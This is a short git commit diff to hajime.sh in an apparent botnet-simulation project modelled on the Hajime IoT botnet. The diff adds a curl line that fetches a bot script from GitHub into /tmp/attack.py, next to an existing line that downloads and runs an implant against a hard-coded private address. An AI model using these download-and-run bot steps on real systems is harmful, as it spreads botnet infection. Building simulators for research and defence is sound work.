c5fd0d0e40c334a0884c8073a438f77c1dbd6a86
rhishi <rhishi.16@gmail.com>
2019-12-31 18:15:40 +0800

    Minor changes.

--- hajime_node/hajime.sh
+++ hajime_node/hajime.sh
@@ -7,5 +7,6 @@ else
     echo "Starting process."
     # get atk file and implant.zip files.
     /usr/bin/curl -LO GET https://github.com/dcsrps/botnet_sim/blob/master/hajime_node/implant/implant.zip?raw=true > /tmp/implant.zip
+    /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/hajime_node/others/init_bot.py > /tmp/attack.py
     python3 /tmp/implant.zip 192.168.1.48 &
 fi
